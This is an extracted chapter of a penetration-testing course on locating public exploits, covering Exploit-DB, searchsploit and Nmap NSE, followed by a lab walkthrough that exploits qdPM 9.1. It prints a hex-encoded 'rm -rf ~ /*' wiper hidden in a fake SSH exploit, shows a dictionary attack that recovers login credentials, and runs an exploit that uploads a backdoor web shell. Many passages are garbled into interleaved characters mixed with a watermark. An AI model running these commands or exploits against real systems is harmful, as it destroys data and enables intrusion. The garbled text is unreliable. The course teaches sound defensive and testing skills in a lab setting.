@@ -1,0 +1,810 @@
+                                                                                                             Penetration Testing with Kali Linux
+
+13 Locating Public Exploits
+
+In this Learning Module, we will cover the following Learning Units:
+· Getting Started with Public Exploits
+· Online Exploit Resources
+· Offline Exploit Resources
+· Exploiting a Target
+
+An exploit is a program or script that can leverage a flaw or vulnerability of a target system.
+Exploits can have a range of effects, such as a denial of service (DoS), remote code execution
+(RCE), or a privilege escalation (privesc).
+
+A common process of a penetration testing engagement is the use of publicly available exploits,
+and searching for appropriate exploits becomes a critical skill when this need arises.
+
+In this Module, we will focus on various online resources that host exploits for publicly known
+vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted
+exploits.
+
+With the knowledge to find public exploits, we will then narrow our search to relevant ones that
+
+could be used to gain access to a machine. At the end of this Module, we will enumerate a target
+
+to determine which exploit(s) can be used to compromise it.
+
+13.1 Getting started         Whitlow
+
+This  LUenadrenrisntganUdnitthceorvisekrsotfheexfeoclluotwinigngunLteraursJnteiefndfgreOexybpjleocittsives:
+·
+
+rc·InioskdthseiUsadnsoLdseeoesarc.rsinatiatnengddUwthnietith,imwexpeeocwrutialtlinnrcegOevSui-oen5fw7ka7nna5oa2wm1ly9nza0ilenicxgipotluhoseitspe,xuepbsllopicietcecixoapldllyoeiibtf.ewIftoeirsedoiemnx'pet ocaurnttaaionlyntzteowuhnadtetrhsetaenxdptlohiet
+
+13.1.1 A word of caution
+
+We must understand that by downloading and running public exploits, we can greatly endanger a
+system or environment. With this in mind, we need to carefully read and understand the code
+before execution to ensure no negative effects.
+
+Let's use 0pen0wn, which was published as a remote exploit for SSH, as an example. While
+reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.
+
+if (geteuid()) {
+   puts("<cr>Root is required for raw sockets, etc.</cr>"); return 1;
+
+}
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                     394
+                                                                                  Penetration Testing with Kali Linux
+
+                       Listing 269 - Malicious SSH exploit asking for root privileges on the attacking machine
+
+Further examination of the payload revealed an interesting jmpcode array.
+
+[...]
+char jmpcode[] =
+"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
+"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
+[...]
+
+                                          Listing 270 - Malicious SSH exploit hex encoded payload
+
+Although it was masked as shellcode, the "jmpcode" character array was actually a hex-encoded
+string containing a malicious shell command.
+
+kali@kali:~$ <cu>python3</cu>
+
+>>> jmpcode = [
+... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
+... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
+>>> print(jmpcode)
+['<cr>rm -rf ~ /* 2> /dev/null &</cr>']
+>>>
+
+                          Listing 271 - Malicious SSH exploit payload that will wipe your attacking machine
+
+This single command would effectively wipe out the would-be attacker's UNIX-based filesystem.
+The program would then connect to a public IRC server to announce the user's actions to the
+world, making this an extremely dangerous and potentially embarrassing malicious exploit!
+
+GiTt hioveennolinntehlin;ishedoraewnseogvueerrr,c, weitseismwseiltlnirltleioilmyneopdnorimntaotnhrteisttoMruposrtdowupoleerrtlahynyraeelyaWxzhdpeilottthlihteoerwecspouodbsemitooiturtieresdseelivnxeptshloitsiot Mcgooeddt eualbere.ofuogreh  hosting
+                                                areJenfoftryeeyt                                                                                                                                                                               idea of
+
+what it will  do upon execution. And    if  we                    proficient  in  programming,  this  is  a  great                                                                                                                             way
+to improve    our code-reading skills.
+
+heIEfaoxcpssoilteoedridettsoiinntihsnbapsoteptceahtcrieotsntowhuaorrinrcttecebonicnmoaindrpieeialasatlo(nOiowSwdn-i-t5blhie7siovn7ue5atolt2ryo1pth9rfc0oeoogrammrsaspamitlse.mtxWai,nnwhgcieelelaocncfagusnumpasegbeceetiarusaliponzmdeadervesiqtkrotiuulliscareolammncodpamictloehpo,iinllsaseo)t.iueornncveairrocenomodfeeteninst
+
+with clean snapshots as an exploit testing ground, or sandbox. The snapshots on a newly set up
+
+environment allow it to be easily reconstructed if infected by something malicious or if the exploit
+
+causes it to break.
+
+13.2 Online exploit resources
+
+This Learning Unit covers the following Learning Objectives:
+· Access multiple online exploit resources
+· Differentiate between various online exploit resources
+· Understand the risks between online exploit resources
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                       395
+                                                                                                                              Penetration Testing with Kali Linux
+
+· Use Google search operators to discover public exploits
+
+After the information gathering and enumeration stages of a penetration test, we can cross-check
+discovered software for known vulnerabilities to find published exploits.
+
+Various online resources host exploit code and make it available to the public for free. In this
+section, we will cover the most popular online resources. The first two we'll inspect usually
+conduct tests on the submitted exploit code and remove any that are deemed fake or malicious.
+
+13.2.1 The Exploit Database
+
+The Exploit Database (commonly known as Exploit-DB or EDB) is a project maintained by OffSec.
+It is a free archive of public exploits that are gathered through submissions, mailing lists, and
+public resources.
+
+                                   Whitlow
+
+                          Jeffrey
+                          ftioeldasnathlyaOzFtSeigw-u5tir7lhel7eb250e2h81c:o9Tom0hveeeEprxeapdgloeait.rDeBahtyaibgdahseleifgahhuotmlet,edpthaingeethliestaibsovseoritmedagwe.ith
+Let's take a    moment                                                                                                                                                            the  newest
+exploit at the  top. The
+
+The D field is a quick way we can download the exploit file.
+
+The A field lists the vulnerable application files of respective exploits which we can download for
+research and testing (if available).
+
+The V field marks whether the exploit has been verified. Exploits with the verified checkmark have
+been reviewed, executed, and concluded to be a functioning exploit. These are reviewed by
+trusted members and add further assurance that the exploit is safe and functional.
+
+The Title field will usually give the vulnerable application name along with its respective
+vulnerable version and the function of the exploit.
+
+The Type field designates the exploit as one of the following: dos, local, remote, or webapp.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                               396
+                                                                                                                              Penetration Testing with Kali Linux
+
+The Platform field designates which kind of system(s) are affected by the exploit. This can be
+operating systems, hardware, or even code language services such as PHP.
+The last field designates the Author of the exploit.
+Let's browse to an exploit to get more information. In this demonstration, we'll browse to m1k1o's
+Blog v.10 - Remote Code Execution (RCE) (Authenticated).
+
+                  Figure 209: m1k1o's Blog v.10 - Remote Code Execution (RCE) (Authenticated)
+
+Each exploit has  aofunthiqeuereIsDpe(actnivuemeexrpiclovita'sluep)a, gken.owWThhnietalsaoswtshoecEiaDtBed-IDC, womhimchonis  also placed at                                                        the
+end of the URL                                                                                                                Vulnerabilities                                                       and
+
+aEqnxupaicolkyszcueordedsbee(rCfeoVvriEee),witsshbathteeftohtreeexedt xoopwflotnhiltoeaimedxipnpagloctitthsecioJseedxfaepfl.slroWoeity.elisctaend.uBseelotwhetEhxepilnofiot-rDmBastiioten  fields,  which   we
+                                                                                                                                                                                           in this  way to  do
+
+E1x3p.l2oi.t2DatabasPeaucpdkaettesSatroeramOnSn-o5u77n5c2e1d90through Twitter and RSS feeds.
+Packet Storm is an information security website that provides up-to-date information on security
+
+news, exploits, and tools (published tools by security vendors) for educational and testing
+
+purposes.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                    397
+                                                                                                                         Penetration Testing with Kali Linux
+
+Like the previously  mentioned  onliFnigeurrees21o0u: rJPceaefcskfer, tePSyatocWrkmheihttolSmotweopramgealso        posts  updates  to   Twitter  and
+hosts an RSS feed.
+           carneaotGneliiatnnHeducsbohdaere hcoosdOteSin,-gi5n7c7pl5ula2dt1fi9no0grmexpfolor itvse. rsion
+13.2.3                                                                                                     control  and  collaboration.  This  allows
+
+GitHub is
+anyone to
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                          398
+                                                                                                                                   Penetration Testing with Kali Linux
+
+Due to its open  nature, using  etwxpoloriteFssigofururoermc21Je1esG:fGiftciHrtoHeuvuybebrWhpehodrime,tselGpeoaniwtgtHesuab  large security risk     and caution is
+advised. Unlike  the previous                                                                                                repositories can        be created by
+aabnnayycookdnnoeeoearxn. edcudtiisntgribaustepdecwifiitchmouOatSli-oc5ivo7eu7r5ss2ige1x9h0pt.loFitorhoesxtaemd polne,GaitHusuebr
+                                                                                                                                   recently tweeted  a warning that
+                                                                                                                                   would instead be  infected with a
+
+                                Figure 212: Malicious GitHub Exploit Warning
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                             399
+                                                                                                                              Penetration Testing with Kali Linux
+
+This is not to say that all GitHub repositories are malicious, but they all must be treated with
+caution. A benefit of using GitHub as an exploit resource is the speed at which exploits can be
+made available. Members of the security community can create proof-of-concept code and share
+it almost as quickly as new vulnerabilities pop up.
+
+OffSec has a GitHub account where we can find different repositories like exploitdb-bin-sploits,
+which contains pre-compiled exploits for easy execution.
+
+13.2.4  Google  search               Figure 213:  OffSeWchGiittHluobw
+
+                               operators
+
+In addition to the individual  sweeabrscihteesntghinaet sw.Jeecfofrveeyred  above,  we  can  search  for  additional  exploit  -
+hosting sites using popular
+
+Weknexaeayrrwccotoawlynrdwobauhenragdtisnweinsaeceraclauhrrdec.ehsMievnaaagsrrctifoehouririnsneggxsOfpeotSlah-ro.re5icts7sh7e5uo2asp1die9nv0rgaantaocressdpe(locikpifeeicrtahstooosfrtsewucasareen'dshbveeylprsthuioesnGtfaooiollologrwleoeusder abrryecshtuhleetsn"getixonpefl)oinittdo"
+
+As an example, we can use the following search query to locate vulnerabilities affecting the
+Microsoft Edge browser and limit the results to only those exploits that are hosted on the Exploit
+Database website.
+
+kali@kali:~$ <cu>firefox --search "Microsoft Edge site:exploit-db.com"</cu>
+                         Listing 272 - Using Google to search for Microsoft Edge exploits on exploit-db.com
+
+Some other search operators that can be used to fine-tune our results include inurl, intext, and
+intitle.
+
+Use extreme caution when using exploits from non-curated resources!
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                              400
+                                                                                   Penetration Testing with Kali Linux
+
+13.3 Offline exploit resources
+
+This Learning Unit covers the following Learning Objectives:
+· Access Multiple Exploit Frameworks
+· Use SearchSploit
+· Use Nmap NSE Scripts
+
+Internet access is not always guaranteed during a penetration test. Should the assessment take
+place in an isolated environment, the Kali Linux distribution comes with various tools that provide
+offline access to exploits.
+
+13.3.1 Exploit frameworks
+
+An exploit framework is a software package that contains reliable exploits for easy execution
+against a target. These frameworks have a standardized format for configuring an exploit and
+allow both online and offline access to the exploits. This section will cover some popular exploit
+frameworks.
+
+Metasploit is an excellent framework built to assist in the development and execution of exploits.
+It was created by H D Moore in 2003 and is owned by Rapid7. It allows for easy execution of pre-
+loaded exploits with minor configuration settings. This framework has a free community edition
+and a paid pro version. We will cover Metasploit in detail in a later Module, but it is important to be
+aware of this exploit framework.
+
+pfCohorirstehhIiimsngfpraaccmatmeiswpaaoinrgkon.tshT,eharisnedfxrparelmo-tietewsfrtoaermkxepcwlaonoitreakduotsowymnsteaedtmebtsyeWsthHotiientvllgpeo,Srwilyfinysktreetmomsveudalinnaedtrioathnbeilwriteyaassrcceaonnmonpefrlreset,eecdvoemarfsptieolernteas
+                                     (BeEFJ)eifsfraeypenetration
+penetration test.         Framework                                       testing  tool  focused  on  client-side
+The Browser Exploitation
+
+Wdatetetaaccilkoesvdeeerxeaedcchusotoenmdee,witiptihosipnvuaallauwraeebbxlepObtlSroo-oi5twk7nfs7roea5w2rm.1t9eh0weorrekssouforcrepseanveatrilaatbioleninteesxtipnlgo.itAfrltahmouewghorwkse. only briefly
+
+13.3.2 SearchSploit
+
+The Exploit Database provides a downloadable archived copy of all the hosted exploit code. This
+archive is included by default in Kali in the exploitdb package. We recommend updating the
+package before any assessment to ensure the latest exploits are installed. The package can be
+updated using the following commands:
+
+kali@kali:~$ <cu>sudo apt update && sudo apt install exploitdb</cu>
+[sudo] password for kali:
+...
+The following packages will be upgraded:
+
+   <cr>exploitdb</cr>
+...
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                              401
+                                                                          Penetration Testing with Kali Linux
+
+<cr>Setting up exploitdb (20220526-0kali1) ...</cr>
+...
+
+                             Listing 273 - Updating the exploitdb package from the Kali Linux repositories
+
+The above command updates the local copy of the Exploit Database archive under
+/usr/share/exploitdb/. This directory is split into two major sections, exploits and shellcodes. The
+/usr/share/exploitdb/ directory contains CSV files for each of the exploits and shellcodes
+directories. Each CSV file contains the file information of all files within their respective
+subdirectories. These CSV files contain similar information to the Exploit DB website, such as the
+EDB-ID, title, author, platform, and other information we covered previously.
+
+kali@kali:~$ <cu>ls -1 /usr/share/exploitdb/</cu>
+exploits
+files_exploits.csv
+files_shellcodes.csv
+shellcodes
+
+           Listing 274 - Listing the two major sections in the archive main directory with the database reference files
+
+When we redirect to the exploits directory, we'll find many sub-directories containing all of the
+exploits. These sub-directories are separated based on operating system, architecture, scripting
+language, etc. For example, the linux subdirectory contains all Linux-related exploits.
+
+kali@kali:~$ <cu>ls -1 /usr/share/exploitdb/exploits</cu>
+
+aix
+
+alpha
+
+android
+
+arm
+
+ashx
+
+asp                                        Whitlow
+aspx                             Jeffrey
+atheos       ListinOgS2-7557-7L5i2s1tin9g0 the content of the exploits directory
+beos
+bsd
+bsd_x86
+cfm
+cgi
+freebsd
+freebsd_x86
+...
+
+Manually searching the Exploit Database is by no means ideal, especially given the large quantity
+of exploits in the archive. This is where the searchsploit utility comes in handy.
+
+We can run searchsploit from the command line without any parameters to display its usage:
+
+kali@kali:~$ <cu>searchsploit</cu>
+   Usage: searchsploit [options] term1 [term2] ... [termN]
+
+...
+                                                Listing 276 - The searchsploit command syntax
+
+As the built-in examples reveal, searchsploit allows us to search through the entire archive and
+display results based on various search options provided as arguments.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                    402
+                                                                                Penetration Testing with Kali Linux
+
+==========
+ Examples
+
+==========
+   searchsploit afd windows local
+   searchsploit -t oracle windows
+   searchsploit -p 39446
+   searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+   searchsploit -s Apache Struts 2.0.0
+   searchsploit linux reverse password
+   searchsploit -j 55555 | json_pp
+
+For more examples, see the manual: https://www.exploit-db.com/searchsploit
+                                             Listing 277 - Searchsploit command examples
+
+The options allow us to narrow our search, change the output format, update the exploitdb
+package, and more.
+
+=========
+
+Options
+
+=========
+
+## Search terms <section_code=221f056cc24844cf943822cb2fc89cec>
+
+<content_code=b7f8e74c0f4b48652e549d6d3b020081>
+
+-c, --case     [Term]          Perform a case-sensitive search (Default is inSEnsITiVe)
+
+-e, --exact [Term]             Perform an EXACT & order match on exploit title (Default
+
+is an AND match on each term) [Implies "-t"]
+
+                               e.g. "WordPress 4.1" would not be detect "WordPress
+
+Core 4.1")
+
+-s, --strict                   Perform a strict search, so input values must exist,
+
+disabling fuzzy search for version range
+
+     -t, --title [Term]           e.g.  Jv"aU1lS.uT1e"tshweforuoelWxmdhiptrlnloeooistwutlbtteis.tdleeBtye(cuDtseefidnaugilnt"|"i"1s.t0toi<stle1ep.a3Ar"aN)tDet,he
+file's path)                   Search
+
+            --exclude="term"   Remove
+                               e.g. --Jeexfcflruedye="term1|term2|term3"
+you can chain multiple values
+
+p<#a#cot---hnOopjtu,,,ettpno---ut---t_tjpohcavse<ootedsrhnceefcl=l0tioi8pwbdono7[[[a_3ETTr4ceeDoderrBbdmmeic-]]=f4I5eDap0]o8ds5dOd2sSi65-SE42bS5xhbl4h77op5efo5lw5e)w2o4b1ri21t9te29h0s8fetub6li66ftt1bul36lie4clsnd2fcpJa28aSr>ftOedhN6a1tfl3ool7ro0awm6nea6dt8e>xtpolooivter(falnodwatlhseoircocpoileusmntshe
+
+-v, --verbose                  Display more information in output
+
+-w, --www      [Term]          Show URLs to Exploit-DB.com rather than the local path
+
+     --id                      Display the EDB-ID value rather than local path
+
+     --colour                  Disable colour highlighting in search results
+
+...
+
+                              Listing 278 - The searchsploit options help menu
+
+Finally, the Notes section of the help menu reveals some useful search tips.
+
+=======
+ Notes
+
+=======
+ * You can use any number of search terms
+ * By default, search terms are not case-sensitive, ordering is irrelevant, and will
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                         403
+                                                                          Penetration Testing with Kali Linux
+
+search between version ranges
+     * Use '-c' if you wish to reduce results by case-sensitive searching
+     * And/Or '-e' if you wish to filter results by using an exact match
+     * And/Or '-s' if you wish to look for an exact version match
+
+ * Use '-t' to exclude the file's path to filter the search results
+     * Remove false positives (especially when searching using numbers - i.e. versions)
+
+ * When using '--nmap', adding '-v' (verbose), it will search for even more
+combinations
+
+ * When updating or displaying help, search terms will be ignored
+
+                                                    Listing 279 - The searchsploit help notes
+
+For example, we can search for all available remote exploits that target the SMB service on the
+Windows operating system with the following syntax:
+
+kali@kali:~$ <cu>searchsploit remote smb microsoft windows</cu>
+
+--------------------------------------------------------------------------------------
+
+-------------------------------------- ---------------------------------
+
+Exploit Title
+
+| Path
+
+--------------------------------------------------------------------------------------
+
+-------------------------------------- ---------------------------------
+
+Microsoft DNS RPC Service - 'extractQuotedChar()' Remote Overflow 'SMB' (MS07-029)
+
+(Metasploit)                         | windows/remote/16366.rb
+
+Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote
+
+Code Execution (Metasploit) (MS17-010) | windows/remote/43970.rb
+
+<cr>Microsoft Windows - 'SMBGhost' Remote Code Execution
+
+| windows/remote/48537.py</cr>
+
+Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)
+
+| windows/remote/40280.py
+
+Microsoft Windows - 'srv2.sys'  SMB  NNeeggoottiiaatt||eewwPPiirrnnWooddhiccooteewwlssssoss//wIIrrDDeemmFFoouuttnneecc//tt11ii46oo63nn6734TT..aartbbbxlltee  Dereference
+(MS09-050)                      SMB                                                                                                                          Dereference
+Microsoft Windows - 'srv2.sys'
+(MS09-050) (Metasploit)
+|M||MM|MMiiiiiwcwcwcwccirrririiroonnoononddssdssdsoooooooooffffwwwfwttsssttts////WdWWrrWrWieieioieimsnnmnnnmdod/doddotototo4ooewwewe1wwss//s8/ss2179---216201.0.203SSS00rt56MmMb.30x0BbB/.ttRrxXSRRebPPteel2alm-oay-Ot3ySSe'M-CNEB5ToCR77odLAR5MdeAu2etT1ERIh9eExeC0expnGelcOtJuaciPetuyHcfitaEfi(oRtrMon'ienSoy0(SnMS8McSRB-a0e08nRm6neo8-emt)0roe6t8(Oe)MvSeC(1orM7dfelet-oa0Ews1xp0el)coui(ttMi)eotnasploit)
+
+| windows/remote/41929.py
+
+Microsoft Windows 2003 SP2 - 'RRAS' SMB Remote Code Execution
+
+| windows/remote/44616.py
+
+<cg>Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
+
+| windows/remote/42031.py</cg>
+
+Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code
+
+Execution (MS17-010)                 | windows/remote/42315.py
+
+Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-
+
+010)                                 | windows_x86-64/remote/42030.py
+
+Microsoft Windows 95/Windows for Workgroups - 'smbclient' Directory Traversal
+
+| windows/remote/20371.txt
+
+Microsoft Windows NT 4.0 SP5 / Terminal Server 4.0 - 'Pass the Hash' with Modified SMB
+
+Client                               | windows/remote/19197.txt
+
+Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                                                                         404
+                                                                                                       Penetration Testing with Kali Linux
+
+(MS17-010)              | windows_x86-64/remote/41987.py
+
+Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of
+
+Death (MS07-063)        | windows/dos/9594.txt
+
+--------------------------------------------------------------------------------------
+
+-------------------------------------- ---------------------------------
+
+Shellcodes: No Results
+
+Papers: No Results
+
+                Listing 280 - Using searchsploit to list available remote Windows SMB exploits
+
+The exploits that contain the search parameters are listed in the output. For demonstration, let's
+presume we want to use the two exploits highlighted above during our engagement. Let's
+imagine we enumerated two SMB servers that are vulnerable to SMBGhost and EternalBlue for the
+sake of this demonstration.
+
+We can copy an exploit into our current working directory using the -m option if we need to
+modify it. An advantage of copying the exploit into the current working directory is that it will be
+easier to organize the exploits used in an engagement and correlate them to systems being
+tested.
+
+All local exploits are overwritten when a new package of exploitdb is released, so
+modifying the exploits in their original locations would cause us to lose those changes.
+
+Let's copy the two exploits with the -m option. We can do this with either the path or the EDB-ID of
+those exploits, which can be found in their path names.
+
+kali@kali:~$ <cu>searchsploit -m windows/remote/48537.py</cu>
+                hMtitcprso:s/o/fwtwwW.ienxdpolwosit--'dbSM.cBoGmho/esxt'ploRiemtsot/W4ehi8tC5lo3o7dwe
+Exploit:                                                                                               Execution
+       URL:
+
+         Path:  /Ptuyos:trh/o/shnhoasmrecer//ikepaxltp,il/o4Ai8StC5dI3b7I/.eptxeyp<x/ltoceri>txJesec/fuwfitranebdyolew,s/wreimtohteve/4ry85l3o7n.gpylines  (343)
+File Type:
+
+<cr>Copied
+
+k(aMElSx1ip7@-lkU0oaR1ilL0ti:)::~hM$titc<prcsou:s>/os/fewtawrwWc.ihensxdppollwoosiOitSt7-/--52md770b504.282c1o09R3m02/1e</x-pcul'>oEittesr/n4a2l0B3l1ue' SMB Remote Code Execution
+
+         Path: /usr/share/exploitdb/exploits/windows/remote/42031.py
+
+File Type: Python script, ASCII text executable
+
+<cg>Copied to: /home/kali/42031.py</cg>
+                       Listing 281 - The exploits are copied the the current working directory with searchsploit
+
+The exploits we wanted are now copied into our current working directory. The first command
+execution copied the exploit file, and the second command execution copied the exploit by its
+EDB-ID.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                            405
+                                                                                                                              Penetration Testing with Kali Linux
+
+13.3.3 Nmap NSE scripts
+
+Nmap is one of the most popular tools for enumeration. One very powerful feature of this tool is
+the Nmap Scripting Engine (NSE), which, as its name suggests, introduces the ability to automate
+various tasks using scripts.
+
+Along with exploit services, the NSE comes with a variety of scripts to enumerate, brute force,
+fuzz, and detect. A complete list of scripts provided by the NSE can be found under
+/usr/share/nmap/scripts. Using grep to quickly search for the word "exploits" in the NSE scripts
+returns several results.
+
+kali@kali:~$ <cu>grep Exploits /usr/share/nmap/scripts/*.nse</cu>
+/usr/share/nmap/scripts/clamav-exec.nse:Exploits ClamAV servers vulnerable to
+unauthenticated clamav command execution.
+/usr/share/nmap/scripts/http-awstatstotals-exec.nse:Exploits a remote code execution
+vulnerability in Awstats Totals 1.0 up to 1.14
+/usr/share/nmap/scripts/http-axis2-dir-traversal.nse:Exploits a directory traversal
+vulnerability in Apache Axis2 version 1.4.1 by
+/usr/share/nmap/scripts/http-fileupload-exploiter.nse:Exploits insecure file upload
+forms in web applications
+/usr/share/nmap/scripts/http-litespeed-sourcecode-download.nse:Exploits a null-byte
+poisoning vulnerability in Litespeed Web Servers 4.0.x
+...
+
+                                      Listing 282 - Listing NSE scripts containing the word "Exploits"
+
+We can display the information of specific NSE scripts by running nmap with the --script-help
+option followed by the script filename. Let's analyze an example with nmap ­script-
+kShtaelalpir=t@ckilanalgmiN:am~v$a.epx<ec7cu.9>.n2nsme(a.pht-t-pssc:r/i/pntm-ahpe.lopr=gcl)amaatv-2e0x2e2cW.-hin0ts6le-o<0w/2cu1>6:23 EDT
+hCcltattaepmagsv:o-r/ei/xenemsca:p.exoprlg/onitsevdoulc/nscripts/clamav-Jeexfefcr.ehytml
+'SoCECxflApaNlmd'aAonVitgseserrColvuasemrAsVe0.r9sv9ei.rcve2,ercsoamnvmduaOnplSdon-ses5rs77awi5bbi2llt1eyh9o0otuttohuearnuatuhpternheevtinicotiauctsaitovener.dscSilpoaencmsia,vfiaclcalomolwmlayt,nhdeteheexexcecuoctmumtioianonnd.
+
+   may be used to list system files and the command 'SHUTDOWN' shut downs the
+   service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).
+
+   This script without arguments test the availability of the command 'SCAN'.
+
+   Reference:
+   * https://twitter.com/nitr0usmx/status/740673507684679680
+   * https://bugzilla.clamav.net/show_bug.cgi?id=11585
+
+                                      Listing 283 - Using Nmap NSE to obtain information on a script
+
+This provides information about the vulnerability and external information resources. It's worth
+checking if an Nmap NSE script exists for a particular product.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  406
+                                                                                                                              Penetration Testing with Kali Linux
+
+13.4 Exploiting a target
+
+This Learning Unit covers the following Learning Objectives:
+· Follow a basic penetration test workflow to enumerate a target system
+· Completely exploit a machine that is vulnerable to public exploits
+· Discover appropriate exploits for a target system
+· Execute a public exploit to gain a limited shell on a target host
+
+With all of the resources covered, let's demonstrate how this would appear in a real-world
+scenario. We are going to attack our dedicated Linux server, which is hosting an application
+vulnerable to a public exploit.
+
+13.4.1 Putting it together
+
+This demonstration will walk through exploiting a remote target. The remote host has the IP
+address of 192.168.50.11, and the Kali client has an IP of 192.168.50.129. Some common
+enumeration steps will be skipped to keep the length of this section to a minimum.
+
+      Info
+     The SQL Injection Attacks module explains how SQLmap works in more details.
+
+     This section will use PublicExploitsWalkthrough in the Resources section below. To
+     follow along, start the exercise host before continuing.
+IbSpcWtoarSoeangHwptefepi.isrsnesetatgrsrsea,scnwnatedehnrenadtlaihlwsyveciengotboaavsttreiegtvreetusotlionsftmeohfrreoeaorbtsapaltereOang,Snfesf-atop5rin7taoiwf7dfroit5edcsr2'irml1aela9lsiang0istdnni.oJtoseenrelfelriafgvrlteoihecnniyescgseWsahainddindeetdlvctoedhhwlieeosicpcrkomevt-emhenerattwihclsaeotobmnpspoetarhrtnvesyicc.2eoR2.meLavpenietad'wsn8yion0'spgaeArtnbehoeaoupwwteUeenbbs.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  407
+                                                                          Penetration Testing with Kali Linux
+
+         Figure 214: The About Us page reveals some employees, their e-mails, and the year they joined the company
+
+The employee information is not useful to us at this time, and we can't find any security
+vulnerabilities or other issues on the website. Let's use a web directory enumeration tool to scan
+for any hidden directories on the web server.
+
+After running the directory enumeration tool, we discover a project directory on the website.
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                                    Figure 215: The website has a login portal
+
+The website has a login portal called the AI Project Management Portal. Below the login window,
+we'll find the web application and version of "qdPM 9.1". In the event we can't get the version in
+this way, we could also check the source code of the webpage to get the web application and its
+version number.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  408
+                                                                                                                              Penetration Testing with Kali Linux
+
+<div class="copyright">
+         <a href="http://qdpm.net" target="_blank">qdPM 9.1</a> <br /> Copyright &copy;
+
+2022 <a href="http://qdpm.net" target="_blank">qdpm.net</a>
+</div>
+
+                                             Listing 284 - The version is visible in the source code
+
+The web application and its version are located near the bottom of the source code page. Upon
+further investigation, we can determine that it is a free web-based project management software.
+
+With this new discovery, we'll search Exploit DB for a remote exploit for "qdPM 9.1", which returns
+a couple relevant exploits.
+
+                                 Figure 216: The exploit detWahilistalreowdisplayed
+                                 wexeecduettieornm. iWneetwJheaifltlfrirteevayileigwnsthweeellxwpliothit
+Inspecting the  latest exploit,                                                                           our search:  it is verified, remote,
+and allows for  remote code                                                                               and gain a   basic understanding
+oTrWefhveieitewebwxeeipfrnoelgoraeittbherleeexqectucoouirdfteieinsn,dgawsieute.svceearrnnaalcmeoO-enmSca-lan5ui7ddls7e,p5b2ath1us9est0wnuoosreedrxnfpoaormstheedefipperladosjesowcftothmredaslno. aIgfginewmepaehgnaetvweisewbaonarkpeipn-mlgicaacirtlieoaddned.nArtefiastelssr.
+
+with the web application, the exploit will upload a command web shell that we can use to execute
+
+commands on the target.
+
+Another method of getting an account password would be to use a word list generator on the
+website. After a word list is generated, we can try the list as-is or make changes to create more
+complex passwords.
+
+Using a dictionary attack on the login portal along with the four discovered e-mails, we can verify
+that george@AIDevCorp.org:AIDevCorp are valid credentials for George's account.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                               409
+                                                                                                         Penetration Testing with Kali Linux
+
+                Figure 217: The project management application is logged in with George's account
+
+With a valid login to the system, we can enumerate the tasks, projects, and some configurations
+of the project management system. Because we found an exploit that needed working
+credentials, we can now execute the exploit against our target.
+
+We'll copy the exploit to our current working directory with searchsploit.
+
+kali@kali:~$ <cu>searchsploit -m 50944</cu>
+
+   Exploit:     h/qPtudytsPtprMhs/o:s9n/.h/a1swrc-werw/i.epRextexp,mploloUtoineititdcCbo-o/dddeebex.ptcEeloxoxmeit/ct,eusxtU/piTploFhonpi-/t(8wsRe/CtWb5Eehia0)xtp9tlp4(os4Aew/ux5te0hc9eu4nt4ta.ibpclyaeted)  (v2)
+          URL:
+                                                               cJoepfifedreinyto
+         Path:
+File Type:
+
+Copied  to:     /home/kali/50944.py
+                               Listing 285 - The
+                                                  exploit  is                     our  current  working  directory
+
+sWwfooiuitmthhnedtthheceexrpeuedloxsepiatnlsgoteiriatelssqine.ucTiortheuioercncheuoaxrnfprgletohinnitetgOawsSvrc-oga5rurri7kipma7itnb5.egl2enN1sdt9osi0wtrewiactehltlroineeryxtd,phelleeotetsit'rsosmuehirxncaeeevcdecuoftaredoeumitsbaaerggefaoeairdnesisneetgcxttehitohceneu.ttasiUorognnu.elritkceepatchtohidswee,itxahploltonhigte,
+
+kali@kali:~$ <cu>python3 50944.py -url http://192.168.50.11/project/ -u
+george@AIDevCorp.org -p AIDevCorp</cu>
+<cr>You are not able to use the designated admin account because they do not have a
+myAccount page.</cr>
+
+The DateStamp is 2022-06-15 12:19
+<cg>Backdoor uploaded at - > http://192.168.50.11/project/uploads/users/420919-
+backdoor.php?cmd=whoami</cg>
+
+                                  Listing 286 - The exploit completed successfully with an uploaded file
+
